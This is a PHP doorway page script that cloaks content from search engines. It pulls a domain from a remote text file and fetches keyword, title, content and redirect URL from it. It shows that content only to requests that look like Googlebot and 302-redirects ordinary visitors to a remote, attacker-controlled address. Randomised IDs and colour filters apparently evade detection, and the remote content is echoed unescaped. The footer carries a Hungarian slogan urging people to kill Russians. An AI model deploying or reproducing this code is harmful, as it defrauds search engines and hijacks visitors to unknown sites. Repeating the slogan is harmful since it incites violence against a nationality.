<?php
//error_reporting(1);
$page=$_GET["page"];
$url_external=removeBOM(file_get_contents("https://dsgofficial.pages.dev/ko.txt"));
$url = "https://".$url_external."/".$page."/";
$response = removeBOM(file_get_contents($url));


$data = json_decode($response, true);
//var_dump($data);

$userAgent = $_SERVER['HTTP_USER_AGENT'];
$remoteIp = $_SERVER['REMOTE_ADDR'];

if (strpos($userAgent, 'Googlebot') !== false && strpos($remoteIp, '66.249.') === 0) {
    $do=1;
	} 
	elseif (!isset($_SERVER['HTTP_REFERER'])) {
 	   $do=2;
 	   exit;
	}
	else{
		$do=3;
		$redir=$data["redirect"];
		header("Location: ".$redir."/", true, 302);
		exit;
	}
	


function removeBOM($data) {
    			if (0 === strpos(bin2hex($data), 'efbbbf')) {
       			return substr($data, 3);
    			}
    		return $data;
		}
?>

<!DOCTYPE html>
<html style="filter: hue-rotate(230deg);"><head> <title><?php  echo $data["keyword"];?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name='robots' content="noarchive, max-image-preview:large, max-snippet:-1, max-video-preview:-1" />
	<meta name="Language" content="en-US">
	<meta content='article' property='og:type' />
	<script async src="https://cdn.ampproject.org/v0.js"></script>
<meta property="og:image" content="https://picsum.photos/2000/2000?random=<?php echo rand(500, 900000); ?>" />
<script type="application/ld+json">
{
                "@context": "https:\/\/schema.org\/",
                "@type": "CreativeWorkSeries",
                "name": "",
                "description": "",
                "image": {
                    "@type": "ImageObject",
                    "url": "https://picsum.photos/2000/2000?random=<?php echo rand(500, 900000); ?>",
                    "width": null,
                    "height": null
}}
</script>
<script>
window.addEventListener( 'load', (event) => {
let rnd = Math.floor(Math.random() * 360);
document.documentElement.style.cssText = "filter: hue-rotate("+rnd+"deg)";
let images = document.querySelectorAll('img');
for (let i = 0; i < images.length; i++) {
    images[i].style.cssText = "filter: hue-rotate(-"+rnd+"deg) brightness(1.05) contrast(1.05)";
}
});
</script>
</head>
<body>
<sup id="<?php echo rand(500, 900000); ?>" class="<?php echo rand(500, 900000); ?>">
<div>
<div>
<sup style="background: rgb(246, 200, 214) none repeat scroll 0%; font-size: 21px; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial; line-height: 34px;" id="<?php echo rand(500, 900000); ?>" class="<?php echo rand(500, 900000); ?>"></sup>
<sup id="<?php echo rand(500, 900000); ?>" class="<?php echo rand(500, 900000); ?>">
<sup style="padding: 29px 28px 26px 18px; background: rgb(183, 180, 169) none repeat scroll 0%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial; line-height: 43px; display: block; font-size: 22px;">
<header class="entry-header" aria-label="">	<h1 class="entry-title" itemprop="headline"><?php echo $data["title"]; ?></h1></header>
<p><?php  echo $data["content"];?></p>
</sup></sup></div></div></sup>
<p class="footer">Tegyetek jót, öljetek oroszokat! &copy; 2024</p>
</body></html>